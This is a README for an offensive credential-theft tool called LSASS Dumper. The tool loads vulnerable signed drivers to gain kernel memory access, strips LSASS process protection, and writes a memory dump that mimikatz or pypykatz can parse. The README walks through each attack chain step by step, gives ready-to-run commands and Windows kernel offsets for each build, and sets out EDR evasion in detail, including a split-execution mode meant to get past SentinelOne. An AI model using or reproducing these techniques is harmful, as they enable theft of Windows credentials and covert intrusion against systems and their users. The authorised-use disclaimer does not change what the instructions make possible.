# 🔓 LSASS Dumper

> BYOVD-based LSASS credential dumper — bypasses PPL protection via kernel R/W or DM_KernelSyscall physical memory exploitation, builds a hand-crafted minidump compatible with pypykatz/mimikatz.

## ⚠️ Disclaimer

This tool is for **authorized security research and red team operations only**. Unauthorized use against systems you do not own or have explicit permission to test is illegal. The author assumes no liability for misuse.

---

## Features

### Core
- **BYOVD Kernel R/W** — Exploits vulnerable signed drivers to read/write arbitrary kernel memory
- **PPL Bypass** — Disables LSASS Protected Process Light by zeroing `EPROCESS.Protection`
- **Hand-crafted Minidump** — Builds MDMP format manually, no `MiniDumpWriteDump` (heavily hooked by EDRs)
- **Physical Memory Dump** — Full CR3-based page table walk (VA→PA), bypasses `NtReadVirtualMemory` hooks entirely
- **XOR Encryption** — Optional encryption of dump output to avoid on-disk credential exposure

### Anti-Detection
- **Dynamic API Resolution** — All sensitive APIs resolved at runtime via PEB walk + custom salted hash (clean IAT)
- **Indirect Syscalls** — Hell's Gate / Halo's Gate for NTAPI calls, bypassing user-mode hooks
- **String Encryption** — All sensitive strings (`obfstr`) XOR-encrypted at compile time, no cleartext in binary
- **IOCTL Obfuscation** — Control codes computed at runtime via XOR pairs, not stored as constants
- **Sentinel ONE Evasion** — Split execution mode: separate kernel discovery from LSASS dump across two processes

### Flexibility
- **3 Driver Backends** — viragt64 (virtual memory IOCTL), sfdrvx64 (SpeedFan physical memory), **WinIo64 (recommended)**
- **Multi-method Handle Acquisition** — Direct / Fork / Duplicate / Seclogon strategies
- **Minimal Footprint** — Release binary ~90KB with `opt-level=z`, LTO, strip

---

## Recommended: WinIo64 Mode

**WinIo64 is the recommended backend** for modern environments. Unlike other backends:

- ✅ Section-based physical memory mapping (independent PTEs, writable even for read-only kernel pages)
- ✅ Full physical memory dump path — never calls `NtReadVirtualMemory` (undetectable by user-mode EDR hooks)
- ✅ CR3 page table walk for VA→PA translation (4KB/2MB/1GB pages)
- ✅ Sentinel ONE split execution support (`--recon` + `--ntos-base`/`--trampoline`)
- ✅ Does not require PPL/ETW bypass — all operations via Ring 0 trampoline

### Quick Start (WinIo64)

```powershell
# Build with driver loader support
cargo build --release --features driver-loader

# Single-shot (full execution in one process)
.\lsass-dumper.exe -d winio64.sys -s winio64 -t winio

# Split execution (evades Sentinel ONE behavioral detection)
# Step 1: Recon — discover kernel info, then exit
.\lsass-dumper.exe -d winio64.sys -s winio64 -t winio --recon
# Output: --ntos-base FFFFF805DC800000 --trampoline 1A2B3000

# Step 2: Dump — skip all kernel discovery, use precomputed values
.\lsass-dumper.exe -d winio64.sys -s winio64 -t winio --ntos-base FFFFF805DC800000 --trampoline 1A2B3000

# With encryption
.\lsass-dumper.exe -d winio64.sys -s winio64 -t winio --encrypt
```

---

## Attack Chains

### Mode 1: viragt (Virtual Memory IOCTL)
```
Step 0  →  PEB Walk → Resolve APIs dynamically (no IAT footprint)
Step 1  →  SCM → Load vulnerable driver as kernel service
Step 2  →  CreateFileW("\\.\viragtlt") → Open kernel R/W channel
Step 3  →  Kernel R/W → Walk EPROCESS list → Zero LSASS Protection byte
Step 4  →  NtOpenProcess(PROCESS_ALL_ACCESS) → Get LSASS handle
Step 5  →  VirtualQueryEx + ReadProcessMemory → Build minidump
Step 6  →  Restore original Protection value
Step 7  →  Cleanup (close handles, optionally unload driver)
```

### Mode 2: sfdrv (DM_KernelSyscall — SpeedFan Physical Memory)
```
Step 0  →  PEB Walk → Resolve APIs dynamically
Step 1  →  SCM → Load sfdrvx64.sys as kernel service
Step 2  →  Open "\\.\Speedfan" → Locate NtShutdownSystem in physical memory
Step 3  →  Patch trampoline → JMP ZwOpenProcess → Call from user-mode
          → Kernel-mode ZwOpenProcess(LSASS, PROCESS_ALL_ACCESS)
Step 4  →  NtReadVirtualMemory → Build minidump
Step 5  →  Cleanup
```

### Mode 3: winio (DM_KernelSyscall — WinIo64 Section Mapping) ⭐ Recommended
```
Step 0  →  PEB Walk → Resolve APIs dynamically
Step 1  →  SCM → Load winio64.sys as kernel service
Step 2  →  Open "\\.\WinIo" → ZwMapViewOfSection(\Device\PhysicalMemory)
          → Locate NtShutdownSystem via physical memory scan
Step 3  →  Patch trampoline → JMP ZwOpenProcess → Get kernel handle
          → ZwDuplicateObject → User-mode handle (bypasses PPL entirely)
Step 3b →  PsLookupProcessByProcessId → MmGetPhysicalAddress → read_phys
          → Get LSASS CR3 (page table base)
Step 4  →  Physical memory dump: CR3 → PML4 → PDPT → PD → PT → PA
          → read_phys for each page (NO NtReadVirtualMemory calls)
Step 5  →  Build MDMP → Write to disk
```

> **Key advantage**: WinIo64's Section-based mapping creates independent PTEs, allowing writes to read-only kernel pages. The physical memory dump path never calls `NtReadVirtualMemory`, making it invisible to all user-mode EDR hooks.

---

## Sentinel ONE Evasion

Sentinel ONE detects the behavioral chain of kernel base discovery + LSASS dump in the **same process**. The split execution mode breaks this:

```
Process A (--recon)                    Process B (--ntos-base + --trampoline)
┌────────────────────────┐            ┌────────────────────────────┐
│ Connect driver         │            │ Connect driver             │
│ NtQuerySystemInfo      │            │ ❌ Skip kernel base query  │
│ locate_syscall scan    │            │ ❌ Skip physical mem scan  │
│ Print results          │            │ Use precomputed values     │
│ Exit immediately ✓     │            │ open_process → get_cr3     │
└────────────────────────┘            │ → physical dump → write    │
                                      └────────────────────────────┘
```

---

## Supported Windows Versions

| Build | Version | EPROCESS Layout | Status |
|-------|---------|-----------------|--------|
| 17763 | Win10 1809 / Server 2019 | Standard | ✅ |
| 18362 | Win10 1903 | Standard | ✅ |
| 18363 | Win10 1909 | Standard | ✅ |
| 19041 | Win10 2004 | Restructured | ✅ |
| 19042 | Win10 20H2 | Restructured | ✅ |
| 19043 | Win10 21H1 | Restructured | ✅ |
| 19044 | Win10 21H2 | Restructured | ✅ |
| 19045 | Win10 22H2 | Restructured | ✅ |
| 22000 | Win11 21H2 | Restructured | ✅ |
| 22621 | Win11 22H2 | Restructured | ✅ |
| 22631 | Win11 23H2 | Restructured | ✅ |
| 26100 | Win11 24H2 | Restructured | ✅ |
| 26200 | Win11 25H2 | **Major restructure** | ✅ |

> **Note**: Windows 11 25H2 (Build 26200) has a significantly restructured EPROCESS. All field offsets changed (e.g., UniqueProcessId: 0x440 → 0x1D0, Token: 0x4B8 → 0x248). The fallback for unknown builds ≥19041 uses the pre-25H2 layout — verify offsets on newer builds.

---

## Usage

### Build

```powershell
# Standard build (no driver loader — driver must be manually loaded)
cargo build --release

cargo build --release --features driver-loader

# Mode 1: viragt64 — virtual memory R/W (requires PPL bypass)
lsass-dumper.exe -d viragt64.sys -s viragt64 -t viragt -m seclogon

# 模式 2：sfdrvx64 — DM_KernelSyscall（无需 PPL 绕过,建议使用 winio.sys）
lsass-dumper.exe -d winio.sys -s winio -t winio

# With encryption
lsass-dumper.exe -d winio.sys -s winio -t winio --encrypt

# Allow driver unload (dangerous for viragt64 — may BSOD)
lsass-dumper.exe --no-unload=false
```

### CLI Options

| Flag | Default | Description |
|------|---------|-------------|
| `-d, --driver` | `input.sys` | Path to vulnerable driver (requires `driver-loader` feature) |
| `-o, --output` | `output.dmp` | Output dump file path |
| `-s, --service-name` | `svc` | Windows service name (requires `driver-loader` feature) |
| `-t, --driver-type` | — | Backend: `viragt` / `sfdrv` / `winio` (recommended) |
| `-m, --method` | `seclogon` | Handle method (viragt only): `direct` / `fork` / `dup` / `seclogon` |
| `--encrypt` | `false` | XOR encrypt the dump |
| `--no-restore` | `false` | Skip restoring PPL after dump |
| `--no-unload` | `true` | Skip driver unload on exit (requires `driver-loader` feature) |
| `--recon` | `false` | Recon mode: discover kernel info and exit (winio only) |
| `--ntos-base` | — | Precomputed ntoskrnl base address in hex (winio only) |
| `--trampoline` | — | Precomputed trampoline physical address in hex (winio only) |

### Examples

```powershell
# WinIo64 — recommended (physical memory dump, no NtReadVirtualMemory)
.\lsass-dumper.exe -d winio64.sys -s winio64 -t winio

# WinIo64 — split execution (Sentinel ONE evasion)
.\lsass-dumper.exe -d winio64.sys -s winio64 -t winio --recon
.\lsass-dumper.exe -d winio64.sys -s winio64 -t winio --ntos-base <HEX> --trampoline <HEX>

# viragt64 — virtual memory mode (requires PPL bypass)
.\lsass-dumper.exe -d viragt64.sys -s viragt64 -t viragt -m seclogon

# SpeedFan — DM_KernelSyscall (NtReadVirtualMemory path)
.\lsass-dumper.exe -d sfdrvx64.sys -s speedfan -t sfdrv

# With encryption
.\lsass-dumper.exe -d winio64.sys -s winio64 -t winio --encrypt
```

### Parse the Dump

```bash
# pypykatz
pypykatz lsa minidump output.dmp

# mimikatz
mimikatz # sekurlsa::minidump output.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## Project Structure

```
src/
├── main.rs          # CLI, orchestration, SeDebugPrivilege
├── resolver.rs      # PEB walk + custom hash API resolution
├── driver.rs        # SCM driver load/unload (RAII)
├── kernel_rw.rs     # Kernel R/W via viragt64.sys IOCTLs
├── sfdrv64.rs       # DM_KernelSyscall via sfdrvx64.sys
├── winio64.rs       # DM_KernelSyscall via WinIo64.sys (recommended)
├── ppl.rs           # PPL bypass (EPROCESS.Protection zeroing)
├── offsets.rs       # Per-build EPROCESS field offsets
├── handle.rs        # LSASS PID finder + handle acquisition
├── seclogon.rs      # Seclogon handle leak (PID spoofing)
├── minidump.rs      # Hand-crafted MDMP builder + physical memory dump
├── syscall.rs       # Hell's Gate / Halo's Gate indirect syscalls
├── etw.rs           # ETW bypass (user-mode patch)
├── crypto.rs        # XOR encryption for dump output
├── obfstr_helper.rs # Runtime string decryption helpers
└── dumper.rs        # (stub)

docs/
├── winio64_technical.md  # WinIo64 engine technical deep dive (中文)
└── blog_post.md          # Blog-style writeup
```

---

## Anti-Detection Summary

| Detection Vector | Technique | Status |
|-----------------|-----------|--------|
| IAT fingerprinting | PEB walk + custom salted hash (not DJB2) | ✅ Evaded |
| PSAPI imports | `EnumProcessModulesEx` removed, uses `NtQueryVirtualMemory` | ✅ Evaded |
| NtReadVirtualMemory hooks | Physical memory `read_phys` via CR3 page walk | ✅ Evaded |
| String signatures | `obfstr` compile-time XOR encryption | ✅ Evaded |
| IOCTL constants | XOR pairs computed at runtime | ✅ Evaded |
| CLI help text | Neutralized, generic descriptions | ✅ Evaded |
| Sentinel ONE behavioral chain | Split execution (`--recon` + precomputed args) | ✅ Evaded |

---

## References

- [AxiomDumper](https://github.com/mallo-m/AxiomDumper) — DM_KernelSyscall technique for physical memory code execution
- [mimikatz](https://github.com/gentilkiwi/mimikatz) — Original LSASS credential extraction
- [pypykatz](https://github.com/skelsec/pypykatz) — Python LSASS parser
- [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller) — PPL bypass via RTCore64
- [Hell's Gate](https://github.com/am0nsec/HellsGate) — Dynamic syscall resolution
- [Halo's Gate](https://blog.sektor7.net/#!res/2021/halosgate.md) — Syscall resolution for hooked ntdll
- [Vergilius Project](https://www.vergiliusproject.com/kernels/x64/) — Windows kernel structure offsets
- [LOLDrivers](https://www.loldrivers.io/) — Living Off The Land Drivers catalog

---

## License

For authorized security research use only. No warranty provided.
